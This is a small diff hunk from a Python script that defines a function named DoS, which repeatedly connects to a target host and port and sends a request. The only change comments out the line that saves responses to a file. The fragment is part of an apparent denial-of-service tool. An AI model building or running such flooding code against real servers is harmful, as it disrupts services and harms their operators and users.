@@ -19,7 +19,7 @@ def DoS(target,port,get,loop=1) :
         try:
             s.connect((target,port))
             s.send(message)
-            put_file(s.recv(100000000))
+            # put_file(s.recv(100000000))
             sys.stdout.write(".")
         except socket.error:
             sys.stdout.write("X")
